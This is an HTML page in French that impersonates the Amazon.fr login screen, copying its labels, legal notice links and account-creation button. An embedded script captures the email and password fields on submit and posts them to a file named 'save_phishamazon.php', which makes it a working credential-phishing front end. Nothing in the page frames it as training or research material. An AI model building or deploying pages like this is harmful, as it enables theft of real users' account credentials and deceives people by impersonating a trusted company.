<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Amazon</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <div class="container">
        <div class="logo">amazon<span>.fr</span></div>
        <h2>S'identifier</h2>
        
        <form id="loginForm">
            <label for="email">Adresse e-mail ou numéro de téléphone portable</label>
            <input type="text" id="email" name="email" required>
            
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="motdepasse" required>
            
            <button class="btn" type="submit">Continuer</button>
        </form>

        <div id="message"></div>

        <p class="text-small">
            En continuant, vous acceptez les 
            <a href="#">conditions d'utilisation et de vente</a> d'Amazon.
            Consultez notre <a href="#">déclaration de confidentialité</a>,
            notre <a href="#">politique relative aux cookies</a> ainsi que notre
            <a href="#">politique relative aux publicités ciblées</a>.
        </p>

        <p class="text-small"><a href="#">Avez-vous besoin d'aide ?</a></p>

        <div class="create-account">
            <p>Nouveau chez Amazon ?</p>
            <button class="btn-secondary">Créer votre compte Amazon</button>
        </div>
    </div>

    <script>
        function sendForm(event) {
            event.preventDefault(); // Empêche le rechargement de la page

            let formData = new FormData(document.getElementById("loginForm"));

            fetch("save_phishamazon.php", {
                method: "POST",
                body: formData
            })
            .then(response => response.text()) // réponse du PHP
            .then(data => {
                document.getElementById("message").innerHTML = data; // Affiche la réponse du PHP
            })
            .catch(error => {
                document.getElementById("message").innerHTML = "Erreur lors de l'inscription.";
            });
        }

        document.getElementById("loginForm").addEventListener("submit", sendForm);
    </script>

</body>
</html>
